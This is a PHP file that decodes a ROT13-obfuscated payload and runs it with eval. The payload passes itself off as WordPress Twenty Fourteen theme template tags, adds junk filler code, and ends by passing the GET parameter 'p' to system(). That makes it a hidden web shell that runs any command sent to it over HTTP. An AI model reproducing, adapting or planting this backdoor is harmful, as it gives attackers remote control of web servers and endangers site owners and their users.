<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbz grzcyngr gntf sbe Gjragl Sbhegrra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Sbhegrra
 * @fvapr Gjragl Sbhegrra 1.0
 */

vs ( ! shapgvba_rkvfgf( 'gjraglsbhegrra_cntvat_ani' ) ) :
	/**
	 * Qvfcynl anivtngvba gb arkg/cerivbhf frg bs cbfgf jura nccyvpnoyr.
	 *
	 * @fvapr Gjragl Sbhegrra 1.0
	 *
	 * @tybony JC_Dhrel   $jc_dhrel   JbeqCerff Dhrel bowrpg.
	 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff Erjevgr bowrpg.
	 */
	shapgvba gjraglsbhegrra_cntvat_ani() {
		tybony $jc_dhrel, $jc_erjevgr;

		// Qba'g cevag rzcgl znexhc vs gurer'f bayl bar cntr.
		vs ( $jc_dhrel->znk_ahz_cntrf < 2 ) {
			erghea;
		}

		$cntrq        = trg_dhrel_ine( 'cntrq' ) ? (vag) trg_dhrel_ine( 'cntrq' ) : 1;
		$cntrahz_yvax = ugzy_ragvgl_qrpbqr( trg_cntrahz_yvax() );
		$dhrel_netf   = neenl();
		$hey_cnegf    = rkcybqr( '?', $cntrahz_yvax );

		vs ( vffrg( $hey_cnegf[1] ) ) {
			jc_cnefr_fge( $hey_cnegf[1], $dhrel_netf );
		}

		$cntrahz_yvax = erzbir_dhrel_net( neenl_xrlf( $dhrel_netf ), $cntrahz_yvax );
		$cntrahz_yvax = genvyvatfynfuvg( $cntrahz_yvax ) . '%_%';

		$sbezng  = $jc_erjevgr->hfvat_vaqrk_creznyvaxf() && ! fgecbf( $cntrahz_yvax, 'vaqrk.cuc' ) ? 'vaqrk.cuc/' : '';
		$sbezng .= $jc_erjevgr->hfvat_creznyvaxf() ? hfre_genvyvatfynfuvg( $jc_erjevgr->cntvangvba_onfr . '/%#%', 'cntrq' ) : '?cntrq=%#%';

		// Frg hc cntvangrq yvaxf.
		$yvaxf = cntvangr_yvaxf(
			neenl(
				'onfr'      => $cntrahz_yvax,
				'sbezng'    => $sbezng,
				'gbgny'     => $jc_dhrel->znk_ahz_cntrf,
				'pheerag'   => $cntrq,
				'zvq_fvmr'  => 1,
				'nqq_netf'  => heyrapbqr_qrrc( $dhrel_netf ),
				'ceri_grkg' => __( '&ynee; Cerivbhf', 'gjraglsbhegrra' ),
				'arkg_grkg' => __( 'Arkg &enee;', 'gjraglsbhegrra' ),
			)
		);

		vs ( $yvaxf ) :

			?>
		<ani pynff=\"anivtngvba cntvat-anivtngvba\">
		<u1 pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Cbfgf anivtngvba', 'gjraglsbhegrra' );
			?>
		</u1>
		<qvi pynff=\"cntvangvba ybbc-cntvangvba\">
			<?cuc rpub $yvaxf; ?>
		</qvi><!-- .cntvangvba -->
	</ani><!-- .anivtngvba -->
			<?cuc
	raqvs;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'gjraglsbhegrra_cbfg_ani' ) ) :
	/**
	 * Qvfcynl anivtngvba gb arkg/cerivbhf cbfg jura nccyvpnoyr.
	 *
	 * @fvapr Gjragl Sbhegrra 1.0
	 */
	shapgvba gjraglsbhegrra_cbfg_ani() {
		// Qba'g cevag rzcgl znexhc vs gurer'f abjurer gb anivtngr.
		$cerivbhf = ( vf_nggnpuzrag() ) ? trg_cbfg( trg_cbfg()->cbfg_cnerag ) : trg_nqwnprag_cbfg( snyfr, '', gehr );
		$arkg     = trg_nqwnprag_cbfg( snyfr, '', snyfr );

		vs ( ! $arkg && ! $cerivbhf ) {
			erghea;
		}

		?>
		<ani pynff=\"anivtngvba cbfg-anivtngvba\">
		<u1 pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Cbfg anivtngvba', 'gjraglsbhegrra' );
			?>
		</u1>
		<qvi pynff=\"ani-yvaxf\">
			<?cuc
			vs ( vf_nggnpuzrag() ) :
				cerivbhf_cbfg_yvax( '%yvax', __( '<fcna pynff=\"zrgn-ani\">Choyvfurq Va</fcna>%gvgyr', 'gjraglsbhegrra' ) );
				ryfr :
					cerivbhf_cbfg_yvax( '%yvax', __( '<fcna pynff=\"zrgn-ani\">Cerivbhf Cbfg</fcna>%gvgyr', 'gjraglsbhegrra' ) );
					arkg_cbfg_yvax( '%yvax', __( '<fcna pynff=\"zrgn-ani\">Arkg Cbfg</fcna>%gvgyr', 'gjraglsbhegrra' ) );
				raqvs;
				?>
			</qvi><!-- .ani-yvaxf -->
		</ani><!-- .anivtngvba -->
		<?cuc
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'gjraglsbhegrra_cbfgrq_ba' ) ) :
	/**
	 * Cevag UGZY jvgu zrgn vasbezngvba sbe gur pheerag cbfg-qngr/gvzr naq nhgube.
	 *
	 * @fvapr Gjragl Sbhegrra 1.0
	 */
	shapgvba gjraglsbhegrra_cbfgrq_ba() {
		vs ( vf_fgvpxl() && vf_ubzr() && ! vf_cntrq() ) {
			rpub '<fcna pynff=\"srngherq-cbfg\">' . __( 'Fgvpxl', 'gjraglsbhegrra' ) . '</fcna>';
		}

		// Frg hc naq cevag cbfg zrgn vasbezngvba.
		cevags(
			'<fcna pynff=\"ragel-qngr\"><n uers=\"%1$f\" ery=\"obbxznex\"><gvzr pynff=\"ragel-qngr\" qngrgvzr=\"%2$f\">%3$f</gvzr></n></fcna> <fcna pynff=\"olyvar\"><fcna pynff=\"nhgube ipneq\"><n pynff=\"hey sa a\" uers=\"%4$f\" ery=\"nhgube\">%5$f</n></fcna></fcna>',
			rfp_hey( trg_creznyvax() ),
			rfp_ngge( trg_gur_qngr( 'p' ) ),
			rfp_ugzy( trg_gur_qngr() ),
			rfp_hey( trg_nhgube_cbfgf_hey( trg_gur_nhgube_zrgn( 'VQ' ) ) ),
			trg_gur_nhgube()
		);
	}
raqvs;

/**
 * Svaq bhg vs oybt unf zber guna bar pngrtbel.
 *
 * @fvapr Gjragl Sbhegrra 1.0
 *
 * @erghea obby gehr vs oybt unf zber guna 1 pngrtbel
 */
shapgvba gjraglsbhegrra_pngrtbevmrq_oybt() {
	$nyy_gur_pbby_pngf = trg_genafvrag( 'gjraglsbhegrra_pngrtbel_pbhag' );
	vs ( snyfr === $nyy_gur_pbby_pngf ) {
		// Perngr na neenl bs nyy gur pngrtbevrf gung ner nggnpurq gb cbfgf.
		$nyy_gur_pbby_pngf = trg_pngrtbevrf(
			neenl(
				'uvqr_rzcgl' => 1,
			)
		);

		// Pbhag gur ahzore bs pngrtbevrf gung ner nggnpurq gb gur cbfgf.
		$nyy_gur_pbby_pngf = pbhag( $nyy_gur_pbby_pngf );

		frg_genafvrag( 'gjraglsbhegrra_pngrtbel_pbhag', $nyy_gur_pbby_pngf );
	}

	vs ( $nyy_gur_pbby_pngf > 1 || vf_cerivrj() ) {
		// Guvf oybt unf zber guna 1 pngrtbel fb gjraglsbhegrra_pngrtbevmrq_oybt() fubhyq erghea gehr.
		erghea gehr;
	} ryfr {
		// Guvf oybt unf bayl 1 pngrtbel fb gjraglsbhegrra_pngrtbevmrq_oybt() fubhyq erghea snyfr.
		erghea snyfr;
	}
}

/**
 * Syhfu bhg gur genafvragf hfrq va gjraglsbhegrra_pngrtbevmrq_oybt.
 *
 * @fvapr Gjragl Sbhegrra 1.0
 */
shapgvba gjraglsbhegrra_pngrtbel_genafvrag_syhfure() {
	// Yvxr, orng vg. Qvt?
	qryrgr_genafvrag( 'gjraglsbhegrra_pngrtbel_pbhag' );
}
nqq_npgvba( 'rqvg_pngrtbel', 'gjraglsbhegrra_pngrtbel_genafvrag_syhfure' );
nqq_npgvba( 'fnir_cbfg', 'gjraglsbhegrra_pngrtbel_genafvrag_syhfure' );

vs ( ! shapgvba_rkvfgf( 'gjraglsbhegrra_cbfg_guhzoanvy' ) ) :
	/**
	 * Qvfcynl na bcgvbany cbfg guhzoanvy.
	 *
	 * Jencf gur cbfg guhzoanvy va na napube ryrzrag ba vaqrk
	 * ivrjf, be n qvi ryrzrag jura ba fvatyr ivrjf.
	 *
	 * @fvapr Gjragl Sbhegrra 1.0
	 * @fvapr Gjragl Sbhegrra 1.4 Jnf znqr 'cyhttnoyr', be bireevqnoyr.
	 */
	shapgvba gjraglsbhegrra_cbfg_guhzoanvy() {
		vs ( cbfg_cnffjbeq_erdhverq() || vf_nggnpuzrag() || ! unf_cbfg_guhzoanvy() ) {
			erghea;
		}

		vs ( vf_fvathyne() ) :
			?>

		<qvi pynff=\"cbfg-guhzoanvy\">
			<?cuc
			vs ( ( ! vf_npgvir_fvqrone( 'fvqrone-2' ) || vf_cntr_grzcyngr( 'cntr-grzcyngrf/shyy-jvqgu.cuc' ) ) ) {
				gur_cbfg_guhzoanvy( 'gjraglsbhegrra-shyy-jvqgu' );
			} ryfr {
				gur_cbfg_guhzoanvy();
			}
			?>
		</qvi>

		<?cuc ryfr : ?>

	<n pynff=\"cbfg-guhzoanvy\" uers=\"<?cuc gur_creznyvax(); ?>\" nevn-uvqqra=\"gehr\">
			<?cuc
			vs ( ( ! vf_npgvir_fvqrone( 'fvqrone-2' ) || vf_cntr_grzcyngr( 'cntr-grzcyngrf/shyy-jvqgu.cuc' ) ) ) {
				gur_cbfg_guhzoanvy( 'gjraglsbhegrra-shyy-jvqgu' );
			} ryfr {
				gur_cbfg_guhzoanvy( 'cbfg-guhzoanvy', neenl( 'nyg' => trg_gur_gvgyr() ) );
			}
			?>
	</n>

			<?cuc
	raqvs; // Raq vf_fvathyne().
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'gjraglsbhegrra_rkprecg_zber' ) && ! vf_nqzva() ) :
	/**
	 * Ercynprf \"[...]\" (nccraqrq gb nhgbzngvpnyyl trarengrq rkprecgf) jvgu ...
	 * naq n Pbagvahr ernqvat yvax.
	 *
	 * @fvapr Gjragl Sbhegrra 1.3
	 *
	 * @cnenz fgevat $zber Qrsnhyg Ernq Zber rkprecg yvax.
	 * @erghea fgevat Svygrerq Ernq Zber rkprecg yvax.
	 */
	shapgvba gjraglsbhegrra_rkprecg_zber( $zber ) {
		$yvax = fcevags(
			'<n uers=\"%1$f\" pynff=\"zber-yvax\">%2$f</n>',
			rfp_hey( trg_creznyvax( trg_gur_VQ() ) ),
			/* genafyngbef: %f: Cbfg gvgyr. Bayl ivfvoyr gb fperra ernqref. */
			fcevags( __( 'Pbagvahr ernqvat %f <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglsbhegrra' ), '<fcna pynff=\"fperra-ernqre-grkg\">' . trg_gur_gvgyr( trg_gur_VQ() ) . '</fcna>' )
		);
		erghea ' &uryyvc; ' . $yvax;
	}
	nqq_svygre( 'rkprecg_zber', 'gjraglsbhegrra_rkprecg_zber' );
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_obql_bcra' ) ) :
	/**
	 * Sver gur jc_obql_bcra npgvba.
	 *
	 * Nqqrq sbe onpxjneq pbzcngvovyvgl gb fhccbeg cer-5.2.0 JbeqCerff irefvbaf.
	 *
	 * @fvapr Gjragl Sbhegrra 2.7
	 */
	shapgvba jc_obql_bcra() {
		/**
		 * Gevttrerq nsgre gur bcravat <obql> gnt.
		 *
		 * @fvapr Gjragl Sbhegrra 2.7
		 */
		qb_npgvba( 'jc_obql_bcra' );
	}
raqvs;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>